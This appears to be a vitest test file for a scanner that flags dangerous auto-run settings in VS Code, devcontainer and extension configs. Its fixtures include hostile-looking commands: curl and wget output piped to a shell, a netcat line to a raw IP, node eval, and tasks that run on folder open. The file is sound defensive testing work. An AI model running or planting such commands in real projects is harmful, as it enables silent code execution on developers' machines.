import { describe, expect, test } from 'vitest';
import { engineScan } from '../../../src/engine';
import { vscodeFileRules } from '../../../src/engine/rules/vscodeFiles';
import { dangerSignals } from '../../../src/engine/rules/signals';
import { parseJsonc } from '../../../src/engine/parsers/jsonc';
import { aggregate } from '../../../src/engine/verdict';
import { ctx, loadRepo, vf } from '../load';
import { I, T } from '../helpers';

const run = (files: ReturnType<typeof vf>[]) => vscodeFileRules.flatMap((r) => r(files, ctx));
const ids = (files: ReturnType<typeof vf>[]) => run(files).map((f) => `${f.ruleId}:${f.severity}`);
const tasks = (t: unknown[]) => vf('.vscode/tasks.json', JSON.stringify({ version: '2.0.0', tasks: t }, null, 2));

describe('parseJsonc', () => {
  test('accepts comments and trailing commas', () => expect(parseJsonc('{ // c\n "a": 1, }')).toEqual({ value: { a: 1 }, errors: 0 }));
  test('counts errors', () => expect(parseJsonc('{ "a": ').errors).toBeGreaterThan(0));
});

describe('dangerSignals', () => {
  test.each([
    ['curl -s http://x/y | sh', ['network-tool', 'pipe-to-shell']],
    ['wget -qO- x | bash', ['network-tool', 'pipe-to-shell']],
    ['echo aGk= | base64 -d', ['base64']],
    ['node -e "require(1)"', ['node-eval']],
    ['nc 10.0.0.1:4444', ['network-tool', 'raw-ip']],
    ['node .cache/x.js', ['hidden-file']],
    ['npm run build', []],
    ['tsc -w', []],
  ])('%s', (cmd, tags) => expect(dangerSignals(cmd).sort()).toEqual([...tags].sort()));
  test('caps input length', () => expect(dangerSignals('a'.repeat(100000) + ' curl x')).toEqual([]));
});

describe('tasks.folder-open', () => {
  test('interview-task repo: critical at .vscode/tasks.json:14', async () => {
    const r = engineScan(await loadRepo('interview-task'), ctx, vscodeFileRules);
    expect(aggregate(r.findings, r.notChecked, T, I).level).toBe('critical');
    expect(r.findings).toContainEqual(expect.objectContaining({ ruleId: 'tasks.folder-open', severity: 'critical', location: { file: '.vscode/tasks.json', line: 14 } }));
  });
  test('folderOpen with a harmless command → high', () => {
    expect(ids([tasks([{ label: 'a', command: 'npm run dev', runOptions: { runOn: 'folderOpen' } }])])).toEqual(['tasks.folder-open:high']);
  });
  test('task without folderOpen → nothing', () => expect(ids([tasks([{ label: 'a', command: 'curl x | sh' }])])).toEqual([]));
  test('payload hidden in dependsOn task is found', () => {
    expect(ids([tasks([
      { label: 'open', command: 'echo hi', dependsOn: ['mid'], runOptions: { runOn: 'folderOpen' } },
      { label: 'mid', command: 'echo', dependsOn: 'payload' },
      { label: 'payload', command: 'wget -qO- x | bash' },
    ])])).toEqual(['tasks.folder-open:critical']);
  });
  test('dependsOn cycles terminate', () => {
    expect(ids([tasks([{ label: 'a', command: 'echo', dependsOn: 'b', runOptions: { runOn: 'folderOpen' } }, { label: 'b', command: 'echo', dependsOn: 'a' }])])).toEqual(['tasks.folder-open:high']);
  });
  test('payload in linux override is found', () => {
    expect(ids([tasks([{ label: 'a', command: 'echo', linux: { command: 'curl x | sh' }, runOptions: { runOn: 'folderOpen' } }])])).toEqual(['tasks.folder-open:critical']);
  });
  test('payload in args and options.shell is found', () => {
    expect(ids([tasks([{ label: 'a', command: 'bash', args: ['-c', 'curl x | sh'], runOptions: { runOn: 'folderOpen' } }])])).toEqual(['tasks.folder-open:critical']);
    expect(ids([tasks([{ label: 'a', command: 'x', options: { shell: { executable: 'node', args: ['-e'] } }, runOptions: { runOn: 'folderOpen' } }])])).toEqual(['tasks.folder-open:critical']);
  });
  test('npm-type folderOpen task resolves the package.json script', () => {
    const pkg = vf('package.json', JSON.stringify({ scripts: { boot: 'node -e "x"' } }));
    expect(ids([tasks([{ type: 'npm', script: 'boot', runOptions: { runOn: 'folderOpen' } }]), pkg])).toEqual(['tasks.folder-open:critical']);
  });
  test('tasks inside x.code-workspace are found', () => {
    const ws = vf('x.code-workspace', JSON.stringify({ folders: [{ path: '.' }], tasks: { version: '2.0.0', tasks: [{ label: 'a', command: 'curl x|sh', runOptions: { runOn: 'folderOpen' } }] } }));
    expect(ids([ws])).toEqual(['tasks.folder-open:critical']);
  });
  test('invalid JSONC → caution, and a raw folderOpen still flags', () => {
    expect(ids([vf('.vscode/tasks.json', '{ "tasks": [ { "command": "echo" ')])).toEqual(['config.unparseable:caution']);
    expect(ids([vf('.vscode/tasks.json', '{ "tasks": [ { "runOn": "folderOpen", "command": "curl x | sh" ')]).sort()).toEqual(['config.unparseable:caution', 'tasks.folder-open:critical']);
  });
});

describe('unparseable config reaches notChecked (I-5)', () => {
  test('engineScan floors the verdict at unknown', () => {
    const r = engineScan([vf('.vscode/settings.json', '{ "a": ')], ctx, vscodeFileRules);
    expect(r.notChecked).toEqual(['Could not parse .vscode/settings.json']);
    expect(aggregate(r.findings, r.notChecked, T, I).level).toBe('caution');
  });
  test('an empty settings file is valid', () => {
    expect(engineScan([vf('.vscode/settings.json', '  \n')], ctx, vscodeFileRules)).toMatchObject({ findings: [], notChecked: [] });
  });
});

describe('settings rules', () => {
  const s = (o: object) => vf('.vscode/settings.json', JSON.stringify(o));
  test('shell override → high', () => {
    expect(ids([s({ 'terminal.integrated.profiles.linux': { x: { path: 'bash' } } })])).toEqual(['settings.shell-override:high']);
    expect(ids([s({ 'terminal.integrated.env.osx': { NODE_OPTIONS: '--require ./x.js' } })])).toEqual(['settings.shell-override:high']);
  });
  test('executable path pointing at a file in the repo → high', () => {
    expect(ids([s({ 'python.defaultInterpreterPath': '${workspaceFolder}/tools/py' }), vf('tools/py', '#!/bin/sh')])).toEqual(['settings.repo-executable:high']);
    expect(ids([s({ 'eslint.runtime': './bin/node' }), vf('bin/node', 'x')])).toEqual(['settings.repo-executable:high']);
  });
  test('executable path to a file not in the repo → nothing', () => {
    expect(ids([s({ 'python.defaultInterpreterPath': '.venv/bin/python' })])).toEqual([]);
  });
  test('typescript.tsdk in node_modules → nothing', () => {
    expect(ids([s({ 'typescript.tsdk': 'node_modules/typescript/lib' })])).toEqual([]);
  });
  test('task.allowAutomaticTasks on → high', () => expect(ids([s({ 'task.allowAutomaticTasks': 'on' })])).toEqual(['settings.auto-tasks-on:high']));
  test('settings inside a code-workspace are checked', () => {
    expect(ids([vf('a.code-workspace', JSON.stringify({ settings: { 'task.allowAutomaticTasks': 'on' } }))])).toEqual(['settings.auto-tasks-on:high']);
  });
});

describe('devcontainer and extensions', () => {
  test('initializeCommand → high; with signals → critical', () => {
    expect(ids([vf('.devcontainer/devcontainer.json', JSON.stringify({ initializeCommand: 'echo hi' }))])).toEqual(['devcontainer.initialize-command:high']);
    expect(ids([vf('.devcontainer.json', JSON.stringify({ initializeCommand: ['bash', '-c', 'curl x | sh'] }))])).toEqual(['devcontainer.initialize-command:critical']);
  });
  test('postCreateCommand with a network tool → caution', () => {
    expect(ids([vf('.devcontainer/devcontainer.json', JSON.stringify({ postCreateCommand: { a: 'curl -fsSL x | sh' } }))])).toEqual(['devcontainer.post-create-network:caution']);
  });
  test('unknown extension recommendation → caution; well-known → nothing', () => {
    expect(ids([vf('.vscode/extensions.json', JSON.stringify({ recommendations: ['evil-pub.helper'] }))])).toEqual(['extensions.recommendations:caution']);
    expect(ids([vf('.vscode/extensions.json', JSON.stringify({ recommendations: ['dbaeumer.vscode-eslint'] }))])).toEqual([]);
  });
});

describe('clean repo', () => {
  test('clean-template repo: no high or critical', async () => {
    const r = engineScan(await loadRepo('clean-template'), ctx, vscodeFileRules);
    expect(r.findings.filter((f) => f.severity !== 'caution')).toEqual([]);
  });
});
